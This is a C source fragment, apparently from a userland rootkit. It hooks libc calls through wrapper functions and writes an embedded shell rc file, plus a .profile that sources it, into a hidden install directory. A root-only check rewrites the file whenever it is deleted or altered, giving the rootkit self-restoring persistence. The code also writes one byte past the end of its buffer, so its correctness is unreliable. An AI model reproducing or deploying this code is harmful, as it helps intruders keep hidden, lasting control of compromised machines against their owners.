int writebashrc(void){
    DIR *dp;

    hook(COPENDIR, CFOPEN, CFWRITE);
    
    dp = call(COPENDIR, INSTALL_DIR);
    if(dp == NULL)
        return -1;
    closedir(dp);

    char rcbuf[BASHRC_SIZE], tmp[2], curchar;
    memset(rcbuf, 0, sizeof(rcbuf));
    for(int i = 0; i < BASHRC_SIZE; i++){
        curchar = rkbashrc[i];
        snprintf(tmp, 2, "%c", curchar);
        strcat(rcbuf, tmp);
    }
    rcbuf[BASHRC_SIZE] = '\0';

    FILE *fp;

    fp = call(CFOPEN, INSTALL_DIR"/.profile", "w");
    char *profile = ". .bashrc";
    if(fp == NULL)
        return -1;
    call(CFWRITE, profile, 1, strlen(profile), fp);
    fclose(fp);

    fp = call(CFOPEN, BASHRC_PATH, "w");
    if(fp == NULL)
        return -1;
    call(CFWRITE, rcbuf, 1, strlen(rcbuf), fp);
    fclose(fp);

    return 0;
}

void checkbashrc(void){
    if(not_user(0))
        return;

    struct stat rcstat;
    memset(&rcstat, 0, sizeof(struct stat));
    hook(C__XSTAT, CACCESS);

    int accstat = (long)call(CACCESS, INSTALL_DIR"/.profile", F_OK);
    int statstat = (long)call(C__XSTAT, _STAT_VER, BASHRC_PATH, &rcstat);
    if((statstat < 0 && errno == ENOENT) || (accstat != 0 && errno == ENOENT)){
        writebashrc();
        return;
    }

    if(statstat != -1 && rcstat.st_size != BASHRC_SIZE){
        writebashrc();
        return;
    }
}